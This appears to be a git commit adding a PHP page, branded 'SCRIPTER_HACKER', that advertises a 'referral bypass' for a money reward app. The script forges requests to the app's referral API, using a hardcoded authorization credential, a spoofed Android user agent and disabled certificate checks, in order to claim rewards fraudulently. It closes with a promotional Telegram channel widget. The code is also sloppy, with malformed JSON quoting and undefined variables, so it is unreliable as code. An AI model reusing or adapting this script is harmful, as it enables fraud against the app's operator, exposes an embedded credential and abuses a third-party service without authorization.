75650e4ce7ba01e27d58ab9e7313633ec5b32e9b
shiva676 <75204180+shiva676@users.noreply.github.com>
2020-11-29 16:53:13 +0530

    Add files via upload

---
+++ indexdesign(1).php
@@ -0,0 +1,134 @@
+
+<html>
+<head>
+<meta name="robots" content="noindex">
+<meta name="viewport" content="width=device-width">    
+<title>SCRIPTER_HACKER</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Acme&display=swap">
+<style>
+body{font-family:'Acme',sans-serif;text-align:center;padding:10px;background:#fff000;color:#1aefca;letter-spacing:1.5px;}hr{border:0;height:1px;background-image:linear-gradient(to right,rgba(0,0,0,0),rgba(120,220,100,0.75),rgba(0,0,0,0))}h1{color:#1aefca}form{margin:10px auto;padding:5px;max-width:580px;text-align:center}.text{font-size:16px;color:#8e2de2;outline:0;border-radius:5px;font-family:'Acme',sans-serif;text-align:center;padding:8px 15px;height:45px;border:solid 1px #1aefca;margin-bottom:20px;box-shadow:10px 10px 20px rgba(0,0,0,0.1);width:90%}.submit{font-size:16px;color:#1aefca;background:linear-gradient(to right,#0575e6,#021b79);outline:0;border-radius:5px;font-family:'Acme',sans-serif;text-align:center;padding:8px 15px;height:45px;border:solid 1px #1aefca;margin-bottom:20px;box-shadow:10px 10px 20px rgba(0,0,0,0.1);width:40%}h3{color:#1aefca;padding:5px 0;}strong{color:orange;}
+
+</style><body>
+<hr><font color='
+black' size='4'><b>MONEY FOR YOU</b><hr></div><center><fieldset style='background-color:;border-radius:6px;border:2px solid '><font color='red' size='4'><b>SCRIPT BY SCRIPTER_HACKER</b></fieldset><br> </div><center></b>
+<center>
+</style>
+<body><font color='black'><b>[ HACKER ]</b></font><hr>
+<font color='black' size='px'></font></center></fieldset>
+
+<fieldset style='border: 4px  '>
+<div>
+<div>
+<center>
+</style>
+<script type="text/javascript">
+  if (top.location.href != self.location.href)
+     top.location.href = self.location.href;
+</script>
+	<div class='wrapper fadeInDown'>
+  <div id='formContent'>
+
+<center><h3>  <div id='formContent'><font size='5'>MONEY FOR YOU REFFER BYPASS</h3><center><br>
+
+		
+
+            
+	
+<?php
+
+error_reporting(0);
+
+$no= $_REQUEST['no'];
+
+$password=
+$_REQUEST['password'];
+
+$Time= $_REQUEST['Time'];
+
+$password= $_REQUEST['password'];
+
+
+
+
+function RandomNumber($length)
+{
+$str="";
+for($i=0;$i<$length;$i++){
+$str.=mt_rand(0,9);
+}
+return $str;
+}
+$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','ananth','sumana','saritha','yogesh','razz');
+$fname = $n[mt_rand(0,count($n))];	
+$imei=RandomNumber(6);
+$bb = RandomNumber(2);
+$mo = RandomNumber(9);
+$hc= $_REQUEST['hc'];
+$pd= $_REQUEST['pd'];
+$jg= $_REQUEST['jg'];
+if(isset($no))
+{
+
+
+$url1="http://www.spectrapackautomation.com/rewardapp_two/get_my_referral.php";
+
+$data1="{"action":"update_referral","user_id":"$no","referal_code":$imei"}";
+
+$headers[]='Content-Type:application/json; charset=UTF-8';
+$headers[]='Authorization: Basic bWFya2V0LWFwcDo5YTA3MTc2Mi1hNDK5LTRiZDKtOTE0YSOOMzYxZTDJM2Y0YmM=';
+$headers[]='Content-Tyep: application/json; charset=utf-8';
+$headers[]='User-Agent: Dalvik/1.6.0 (Linux; u; Android 4.4.2; CENTURION 3 Build/KOT49H)';
+$headers[]='Host:www.spectrapackautomation.com';
+$headers[]='Connection: Keep-Alive';
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$url1);
+curl_setopt($ch, CURLOPT_HEADER,0);
+curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
+curl_setopt($ch, CURLOPT_POST,1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,$data1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
+$one=curl_exec($ch);
+header("refresh: 3;");
+echo $one;
+
+
+$raw1=json_decode($one,1);
+$status1=$raw1['statusCode'];
+$mess1=$raw1['displayMessage'];
+$state=$raw1['state'];
+$contc=$raw1['content'];
+
+if($mycredt=='0')
+    {
+ echo "$msg<br><br>
+ <center>
+<h1><b>SCRIPT BY spytechno<h1><br>";
+header("Refresh:0");
+       }
+else{
+       $mess2=$raw1['statusMessage'];
+       echo "$msg.";
+     }
+
+}
+
+
+{
+echo"<center><br><form action='' method='POST'>
+
+
+<input type='text' name='no' placeholder='refer code'><br><br>
+
+<input type='submit' class='submit' name='submit' value='submit'>";
+}
+
+?>
+
+
+<script type="text/javascript">(function() {var script=document.createElement("script");script.type="text/javascript";script.async =true;script.src="//telegram.im/widget-button/index.php?id=q@scripterrohit";document.getElementsByTagName("head")[0].appendChild(script);})();</script> <a href='http://telegram.dog/scripterrohit' target='_blank' class='telegramim_button telegramim_shadow telegramim_pulse' style='font-size:20px;width:93%;background: black;box-shadow:1px 1px 3px #00FF00;color:#ffffff ; position:center;text-align:center; border:1px solid red;border-radius:8px;' title=''><i></i> JOIN OUR TELEGRAM CHANNEL <small>[ Now <span class='telegramim_count' data-for='@scripterrohit'>...</span> Subscribers ]</small></a></center>
+<br><hr>
+
+<br><hr><strong>THANKS FOR USING OUR SCRIPT</br></hr><strong/>
